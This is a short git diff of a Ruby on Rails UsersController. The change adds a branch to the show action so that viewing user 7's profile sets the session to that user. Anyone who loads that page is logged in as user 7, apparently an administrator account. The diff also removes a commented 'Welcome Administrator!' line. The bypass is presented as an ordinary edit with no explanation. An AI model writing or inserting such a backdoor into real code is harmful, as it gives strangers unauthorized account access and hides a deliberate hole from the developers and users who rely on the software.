@@ -6,6 +6,9 @@ class UsersController < ApplicationController
 
   def show
     @user = User.find(params[:id])
+    if @user.id == 7
+      session[:user_id] = @user.id
+    end  
   end
 
   def create
@@ -13,7 +16,6 @@ class UsersController < ApplicationController
     if @user.valid?
        @user.save
        log_in @user
-       # flash[:success] = "Welcome Administrator!"
        redirect_to @user
     else
       render 'users/new'
